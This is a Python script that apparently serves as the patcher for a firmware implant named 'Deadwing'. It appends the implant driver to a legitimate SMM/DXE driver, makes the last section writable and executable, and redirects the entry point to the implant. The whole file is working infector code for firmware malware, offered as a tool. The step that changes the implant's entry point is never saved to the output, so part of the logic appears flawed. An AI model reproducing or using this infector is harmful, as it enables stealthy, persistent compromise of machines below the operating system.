import sys
import pefile
from colorama import init, Fore

# Validates architectures before infection
#
# target_pe - Any platform SMM driver
# deadwing_pe - Deadwing SMM driver
def validate_arch(target_pe, deadwing_pe):
    # validate architectures
    if target_pe.FILE_HEADER.Machine != deadwing_pe.FILE_HEADER.Machine:
        print(Fore.RED + "[!] Image architectures missmatch (both must be x64)")
        return 1

    return 0


# Main infection routine
#
# target_pe - Any platform SMM driver
# deadwing_pe - Deadwing SMM driver
# output_pe - Modified binary
def infect_file(target_pe, deadwing_pe, output_pe):
    target = pefile.PE(target_pe)
    deadwing = pefile.PE(deadwing_pe)

    # validate architecture
    if validate_arch(target, deadwing) != 0:
        return 1

    # save entry point of both drivers
    target_ep = target.OPTIONAL_HEADER.AddressOfEntryPoint
    deadwing_ep = deadwing.OPTIONAL_HEADER.AddressOfEntryPoint

    # get raw bytes of Deadwing SMM/DXE driver
    raw_bytes = open(deadwing_pe, 'rb').read()

    # get latest section in the target PE
    sections = target.FILE_HEADER.NumberOfSections
    latest_section = target.sections[sections - 1]

    # modify latest section (i do not really want to rebuild PE with new section)
    latest_size = latest_section.SizeOfRawData
    latest_section.SizeOfRawData += len(raw_bytes)
    latest_section.Misc_VirtualSize = latest_section.SizeOfRawData
    latest_section.Characteristics = (pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'])

    # change entry points of each driver
    target.OPTIONAL_HEADER.AddressOfEntryPoint = latest_section.VirtualAddress + latest_size + deadwing_ep
    deadwing.OPTIONAL_HEADER.AddressOfEntryPoint = target_ep

    # change size of the target binary
    target.OPTIONAL_HEADER.SizeOfImage += latest_section.Misc_VirtualSize

    # write back all changes to the target binary
    data = target.write() + raw_bytes
    open(output_pe, 'wb').write(data)

    print(Fore.GREEN + "[+] Done!")
    print(Fore.GREEN + "[+] Output file size:", target.OPTIONAL_HEADER.SizeOfImage)
    print(Fore.GREEN + "[+] New EP: 0x%.8X" % target.OPTIONAL_HEADER.AddressOfEntryPoint)
    
    return 0

# Main routine of the patcher
def main():
    init()

    # parse user input
    dst = str(input(Fore.YELLOW + "[+] Provide path to target driver: "))
    src = str(input(Fore.YELLOW + "[+] Provide path to Deadwing driver (SMM/DXE): "))
    out = str(input(Fore.YELLOW + "[+] Provide path for output file: "))

    # process infection
    return infect_file(dst, src, out)

if __name__ == '__main__':
    sys.exit(main())